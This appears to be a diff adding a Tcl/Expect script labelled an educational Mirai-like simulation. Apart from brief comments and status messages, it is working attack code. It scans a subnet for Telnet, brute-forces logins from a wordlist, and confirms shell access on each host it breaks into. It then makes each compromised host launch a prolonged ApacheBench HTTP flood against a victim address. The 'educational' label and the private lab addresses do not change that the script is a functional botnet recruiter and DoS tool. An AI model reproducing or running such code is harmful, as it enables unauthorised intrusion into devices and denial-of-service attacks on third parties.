@@ -1,0 +1,122 @@
+#!/usr/bin/expect -f
+#
+# Simulação educacional Mirai-like
+# Scanner + Brute Force com Wordlist + Infecção + Ataque
+#
+
+log_user 0
+stty -echo
+set timeout 6
+
+set victim "192.168.100.30"
+
+# ===== CONFIG SCANNER =====
+set net_prefix "192.168.100"
+set start_ip 10
+set end_ip 25
+
+# ===== WORDLIST EXTERNA =====
+set wordlist_file "/root/wordlist.txt"
+
+if {![file exists $wordlist_file]} {
+    puts "Arquivo wordlist.txt não encontrado!"
+    exit
+}
+
+set fd [open $wordlist_file r]
+set creds [split [read $fd] "\n"]
+close $fd
+
+# ===== FASE 1 – SCANNER TELNET =====
+puts "==== FASE 1: SCANNER TELNET ===="
+
+set targets {}
+
+for {set i $start_ip} {$i <= $end_ip} {incr i} {
+    set ip "$net_prefix.$i"
+    puts "Scaneando $ip:23"
+
+    spawn telnet $ip
+    expect {
+        "login:" {
+            puts "Telnet aberto em $ip"
+            lappend targets $ip
+        }
+        timeout {
+            puts "$ip sem Telnet"
+        }
+    }
+    catch {close}
+}
+
+# ===== FASE 2 – BRUTE FORCE =====
+puts "\n==== FASE 2: BRUTE FORCE ===="
+
+set infected {}
+
+foreach host $targets {
+    puts "\nTentando infectar $host"
+    set success 0
+
+    foreach line $creds {
+        if {$line eq ""} { continue }
+
+        lassign [split $line ":"] user pass
+        puts "Tentando credenciais: $user / $pass ..."
+
+        spawn telnet $host
+
+        expect {
+            "login:" { send "$user\r" }
+            timeout { catch {close}; continue }
+        }
+
+        expect {
+            "Password:" { send "$pass\r" }
+            "login:" { catch {close}; continue }
+            timeout { catch {close}; continue }
+        }
+
+        # PROVA REAL DE EXECUÇÃO REMOTA
+        send "cat /proc/version\r"
+
+        expect {
+            -re {Linux version} {
+                puts "INFECTADO: $host - Credenciais: ($user/$pass)"
+                lappend infected $host
+                set success 1
+                break
+            }
+            "login:" { catch {close}; continue }
+            timeout { catch {close}; continue }
+        }
+    }
+
+    # ===== ATAQUE =====
+    if {$success == 1} {
+        send "export PS1='BOT>'\r"
+        expect "BOT>"
+
+        #send "ab -n 30000 -c 100 http://$victim/ > /dev/null 2>&1 &\r"
+        #send "ab -n 500 -t 40 -c 50 http://$victim/ > /dev/null 2>&1 &\r"
+        send "ab -n 500000 -t 600 -c 50 http://$victim/ > /dev/null 2>&1 &\r"
+	expect "BOT>"
+
+        puts "Ataque iniciado por $host"
+        send "exit\r"
+        expect eof
+    } else {
+        puts "$host não vulnerável"
+    }
+}
+
+# ===== RESUMO =====
+puts "\n==== RESUMO FINAL ===="
+if {[llength $infected] == 0} {
+    puts "Nenhum IoT infectado."
+} else {
+    foreach bot $infected {
+        puts "BOT INFECTADO: $bot"
+    }
+}
+
